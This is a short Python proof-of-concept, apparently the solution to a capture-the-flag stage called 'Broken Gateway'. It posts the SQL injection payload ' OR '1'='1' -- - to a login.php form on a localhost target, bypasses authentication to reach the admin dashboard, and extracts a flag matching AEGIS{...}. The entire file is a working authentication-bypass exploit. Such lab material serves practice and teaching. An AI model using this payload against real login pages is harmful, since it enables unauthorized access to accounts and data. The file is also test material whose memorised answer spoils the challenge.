#!/usr/bin/env python3
"""
Stage 3 -- Broken Gateway: automated SQL injection authentication-bypass PoC.

Exploits the string-concatenation SQL injection vulnerability in login.php
(no prepared statements) to bypass authentication and log in as the admin
account without knowing valid credentials, then scrapes the flag from the
resulting dashboard page.
"""
import re
import sys
import requests

TARGET = "http://localhost:8083"
PAYLOAD_USER = "' OR '1'='1' -- -"
PAYLOAD_PASS = "x"


def exploit():
    session = requests.Session()
    resp = session.post(
        f"{TARGET}/login.php",
        data={"username": PAYLOAD_USER, "password": PAYLOAD_PASS},
        allow_redirects=True,
        timeout=5,
    )

    if "Admin Dashboard" not in resp.text:
        print("[-] Exploit failed -- bypass did not reach the dashboard.")
        sys.exit(1)

    print("[+] SQL injection authentication bypass succeeded.")
    match = re.search(r"AEGIS\{[^}]+\}", resp.text)
    if match:
        print(f"[+] Flag recovered: {match.group(0)}")
    else:
        print("[-] Logged in, but no flag pattern found in the response.")


if __name__ == "__main__":
    exploit()
